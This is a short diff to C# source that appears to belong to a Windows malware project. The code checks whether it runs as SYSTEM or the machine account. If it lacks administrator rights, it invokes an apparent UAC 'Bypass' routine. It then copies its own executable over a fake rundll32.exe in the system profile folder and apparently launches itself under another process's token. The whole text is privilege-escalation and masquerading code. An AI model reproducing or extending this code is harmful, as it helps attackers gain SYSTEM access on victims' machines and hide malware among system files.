@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -24,17 +25,18 @@ namespace Memory
 
         public static void Run()
         {
-            if (Environment.UserName.ToLower() is "system" or @"anon$") return;
+            string host = Environment.MachineName.ToLower() + @"$";
+            if (Environment.UserName.ToLower() == "system" || Environment.UserName.ToLower() == host) return;
             Process process = Process.GetCurrentProcess();
             if (process.MainModule != null)
             {
                 string currentPath = process.MainModule.FileName;
-                const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
                 if (!IsAdministrator())
                 {
                     Task.Run(() => Bypass.Run(currentPath)).Wait();
                     Environment.Exit(0);
                 }
+                const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
                 if (File.Exists(finalPath)) File.Delete(finalPath);
                 if (currentPath != null) File.Copy(currentPath, finalPath);
                 Sudoku.RunWithTokenOf(
